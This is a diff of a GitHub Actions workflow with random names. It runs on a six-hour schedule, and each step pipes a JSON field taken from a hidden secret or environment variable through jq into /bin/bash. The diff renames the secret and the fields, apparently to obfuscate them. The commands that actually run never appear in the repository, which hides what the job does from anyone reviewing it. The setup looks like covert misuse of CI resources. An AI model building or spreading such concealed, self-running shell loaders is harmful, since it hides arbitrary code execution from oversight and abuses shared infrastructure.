@@ -1,9 +1,9 @@
 name: guozhongren1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '33 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: guozhongren1234
         env:
-          wxds8923: ${{ secrets.wxds8923 }}
+          fpxj975: ${{ secrets.fpxj975 }}
         run: |
-          echo $wxds8923 | jq -r .fcbpo07969 | /bin/bash
-          echo $wrqim8 | jq -r .nqj70933 | /bin/bash
-          echo $oid5 | jq -r .pacw7 | /bin/bash
-          echo $uscic07 | jq -r .opv3 | /bin/bash
-          echo $ryvj78 | jq -r .z28025 | /bin/bash
-          echo $lthl6819 | jq -r .lgnp1 | /bin/bash
-          echo $othbv449 | jq -r .pystj39185 | /bin/bash
+          echo $fpxj975 | jq -r .tj7 | /bin/bash
+          echo $g5269 | jq -r .qtb6321 | /bin/bash
+          echo $a0584 | jq -r .kks0656 | /bin/bash
+          echo $ajs397 | jq -r .b6 | /bin/bash
+          echo $lv94 | jq -r .fel85 | /bin/bash
+          echo $mpvt88240 | jq -r .wud49306 | /bin/bash
+          echo $zxim404 | jq -r .s59081 | /bin/bash
+          echo $j7048 | jq -r .as97 | /bin/bash
+          echo $uft3 | jq -r .kbu459 | /bin/bash
 
